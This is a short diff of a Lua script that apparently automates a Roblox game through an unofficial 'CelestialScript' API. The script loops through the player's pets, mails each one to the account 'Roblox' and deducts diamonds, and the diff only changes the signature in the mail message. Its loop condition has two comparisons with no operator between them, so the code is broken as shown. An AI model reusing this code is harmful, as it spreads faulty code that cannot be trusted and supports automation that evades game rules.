@@ -14,7 +14,7 @@ local Diamonds = CelestialScript.GetDiamonds()
 while #Pets > 1 Diamonds > 100000 do
     wait(7)
     local worked, errormsg = pcall(function()
-        CelestialScript.SendMail("Roblox", 0, Pets[1]["uid"], "BroWhat 8139")
+        CelestialScript.SendMail("Roblox", 0, Pets[1]["uid"], "Made By BroWhat 8139")
     end)
     if worked then
         Diamonds = Diamonds - 100000
